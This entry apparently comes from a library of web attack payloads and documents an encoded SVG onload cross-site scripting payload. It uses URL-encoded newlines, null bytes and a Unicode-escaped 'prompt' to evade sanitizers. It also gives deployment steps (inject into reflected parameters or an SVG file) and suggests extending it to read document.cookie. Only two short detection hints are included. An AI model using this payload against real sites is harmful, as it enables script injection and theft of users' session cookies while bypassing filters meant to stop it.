---
id: 0e466d83-65d7-4062-be9d-8832081c6171
type: code
language: JavaScript
verified: true
created_at: '2023-04-06T03:56:42.286307+00:00'
updated_at: '2023-04-10T20:21:55.867714+00:00'
tags:
  - xss
  - svg
  - encoded
platforms:
  - Web
validated: true
---

# Encoded-SVG-Onload-XSS

## Code

```javascript
<svg%0Ao%00nload=%09((pro\u006dpt))()//
```

## Description

Encoded SVG onload using URL encoding (%0A for newline), null bytes (%00), and Unicode for 'prompt' to bypass sanitizers that strip plain onload.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| pro\u006dpt | Obfuscated 'prompt' | Extend to pro\u006dpt(document.cookie) |

## Usage

Place in SVG file or inject into reflected params; decodes and executes on render.

## Detection

- Encoded characters in SVG like %0A or %00.
- Null bytes in web logs.

## Related

- [[procedures/Polyglot-XSS-Attack-using-SVG-Image-Injection]]
